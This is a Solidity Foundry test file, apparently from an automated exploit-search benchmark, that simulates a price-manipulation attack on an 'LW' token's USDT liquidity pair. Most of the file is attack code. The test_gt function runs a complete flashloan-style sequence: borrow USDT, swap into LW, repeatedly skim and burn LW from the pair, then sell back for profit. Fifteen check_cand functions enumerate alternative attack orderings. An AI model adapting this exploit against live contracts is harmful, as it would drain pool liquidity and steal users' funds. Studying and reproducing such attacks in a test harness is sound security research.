// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {LW} from "./LW.sol";
import {URoter} from "./URoter.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract LWTest is Test, BlockLoader {
    LW lw;
    USDT usdt;
    URoter market;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address lwAddr;
    address usdtAddr;
    address marketAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1683857412;
    uint112 reserve0pair = 100930092857807072204654;
    uint112 reserve1pair = 3767123490249856881227641;
    uint32 blockTimestampLastpair = 1683857103;
    uint256 kLastpair = 374355000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair =
        42979102937958107072067407470622733421262;
    uint256 price1CumulativeLastpair = 49723545207970521074840787713857129279;
    uint256 totalSupplylw = 9161514890751000851151891;
    uint256 balanceOflwpair = 3767123490249856881227641;
    uint256 balanceOflwmarket = 0;
    uint256 balanceOflwattacker = 0;
    uint256 totalSupplyusdt = 3379997906401637314353419735;
    uint256 balanceOfusdtpair = 100930092857807072204654;
    uint256 balanceOfusdtmarket = 175239351070869250452833;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        lw = new LW();
        lwAddr = address(lw);
        market = new URoter(address(usdt), address(lw));
        marketAddr = address(market);
        pair = new UniswapV2Pair(
            address(usdt),
            address(lw),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(market), balanceOfusdtmarket);
        usdt.transfer(address(pair), balanceOfusdtpair);
        lw.transfer(address(pair), balanceOflwpair);
        lw._afterdeploy(
            address(router),
            address(pair),
            address(market),
            address(usdt)
        );
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Lw Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(lw), usdt.decimals());
        queryERC20BalanceDecimals(address(lw), address(lw), lw.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(lw), address(usdt), lw.decimals());
        emit log_string("");
        emit log_string("Market Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(market),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(lw), address(market), lw.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(lw), address(pair), lw.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(lw),
            address(attacker),
            lw.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e6 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_lw_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        lw.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_lw_owner(uint256 amount) internal eurus {
        lw.transfer(owner, amount);
    }

    function swap_pair_attacker_usdt_lw(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_lw_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        lw.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_lw_pair(uint256 amount) internal eurus {
        for (uint i; i < 40; i++) {
            lw.transfer(address(pair), amount);
            pair.skim(address(attacker));
            lw.receive_eth();
        }
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        swap_pair_attacker_lw_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        burn_lw_pair(amt1);
        swap_pair_attacker_usdt_lw(amt2, amt3);
        swap_pair_attacker_lw_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        burn_lw_pair(amt3);
        swap_pair_attacker_lw_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        swap_pair_attacker_usdt_lw(amt3, amt4);
        payback_lw_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_lw_owner(amt0);
        burn_lw_pair(amt1);
        swap_pair_attacker_lw_usdt(amt2, amt3);
        swap_pair_attacker_usdt_lw(amt4, amt5);
        payback_lw_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        burn_lw_pair(amt3);
        swap_pair_attacker_usdt_lw(amt4, amt5);
        payback_lw_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        swap_pair_attacker_lw_usdt(amt3, amt4);
        swap_pair_attacker_usdt_lw(amt5, amt6);
        swap_pair_attacker_lw_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_lw_pair(amt1);
        swap_pair_attacker_usdt_lw(amt2, amt3);
        swap_pair_attacker_lw_usdt(amt4, amt5);
        swap_pair_attacker_usdt_lw(amt6, amt7);
        swap_pair_attacker_lw_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        burn_lw_pair(amt3);
        swap_pair_attacker_lw_usdt(amt4, amt5);
        swap_pair_attacker_usdt_lw(amt6, amt7);
        swap_pair_attacker_lw_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        swap_pair_attacker_lw_usdt(amt3, amt4);
        burn_lw_pair(amt5);
        swap_pair_attacker_usdt_lw(amt6, amt7);
        swap_pair_attacker_lw_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        swap_pair_attacker_lw_usdt(amt3, amt4);
        swap_pair_attacker_usdt_lw(amt5, amt6);
        burn_lw_pair(amt7);
        swap_pair_attacker_lw_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        swap_pair_attacker_usdt_lw(amt3, amt4);
        swap_pair_attacker_lw_usdt(amt5, amt6);
        swap_pair_attacker_usdt_lw(amt7, amt8);
        payback_lw_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_lw_owner(amt0);
        burn_lw_pair(amt1);
        swap_pair_attacker_lw_usdt(amt2, amt3);
        swap_pair_attacker_usdt_lw(amt4, amt5);
        swap_pair_attacker_lw_usdt(amt6, amt7);
        swap_pair_attacker_usdt_lw(amt8, amt9);
        payback_lw_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        burn_lw_pair(amt3);
        swap_pair_attacker_usdt_lw(amt4, amt5);
        swap_pair_attacker_lw_usdt(amt6, amt7);
        swap_pair_attacker_usdt_lw(amt8, amt9);
        payback_lw_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        swap_pair_attacker_usdt_lw(amt3, amt4);
        burn_lw_pair(amt5);
        swap_pair_attacker_lw_usdt(amt6, amt7);
        swap_pair_attacker_usdt_lw(amt8, amt9);
        payback_lw_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_lw_owner(amt0);
        swap_pair_attacker_lw_usdt(amt1, amt2);
        swap_pair_attacker_usdt_lw(amt3, amt4);
        swap_pair_attacker_lw_usdt(amt5, amt6);
        burn_lw_pair(amt7);
        swap_pair_attacker_usdt_lw(amt8, amt9);
        payback_lw_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        emit log_named_uint("amt0", 1000000 ether);
        borrow_usdt_owner(1000000 ether);
        printBalance("After step0 ");
        emit log_named_uint("amt1", usdt.balanceOf(address(attacker)));
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
        );
        swap_pair_attacker_usdt_lw(
            usdt.balanceOf(address(attacker)),
            pair.getAmountOut(usdt.balanceOf(address(attacker)), address(usdt))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", (2510e18 * 1e18) / lw.getTokenPrice());
        burn_lw_pair((2510e18 * 1e18) / lw.getTokenPrice());
        printBalance("After step2 ");
        emit log_named_uint("amt4", lw.balanceOf(address(attacker)));
        emit log_named_uint(
            "amt5",
            (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
                9) / 10
        );
        swap_pair_attacker_lw_usdt(
            lw.balanceOf(address(attacker)),
            (pair.getAmountOut(lw.balanceOf(address(attacker)), address(lw)) *
                9) / 10
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 1000000 ether);
        payback_usdt_owner(1000000 ether);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_lw(amt1, amt2);
        burn_lw_pair(amt3);
        swap_pair_attacker_lw_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
